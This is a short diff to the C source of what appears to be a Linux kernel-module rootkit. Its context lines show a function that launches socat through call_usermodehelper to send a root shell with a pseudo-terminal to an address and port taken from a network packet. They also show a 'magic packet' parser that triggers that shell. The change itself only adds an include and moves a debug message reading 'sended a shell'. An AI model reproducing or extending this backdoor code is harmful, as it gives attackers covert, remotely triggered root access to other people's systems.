@@ -5,6 +5,8 @@
 #include <linux/net.h>
 #include <linux/tcp.h>
 
+#include "hooks.h"
+
 void invoke_socat_shell(char *argv[]) {
   char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/", "TERM=xterm",
                   NULL};
@@ -17,6 +19,10 @@ void invoke_socat_shell(char *argv[]) {
            "-li',pty,stderr,setsid,sigint,sane",
            argv[0], argv[1]);
   call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);
+
+#ifdef DEBUG
+  printk(KERN_INFO "sended a shell to %s on port %s\n", argv[0], argv[1]);
+#endif
 }
 
 unsigned int magic_packet_parse(struct sk_buff *socket_buffer) {
@@ -68,9 +74,6 @@ unsigned int magic_packet_parse(struct sk_buff *socket_buffer) {
 
         if (argv) {
           invoke_socat_shell(argv);
-#ifdef DEBUG
-          printk(KERN_INFO "sended a shell\n");
-#endif
           argv_free(argv);
         }
         kfree(_data);
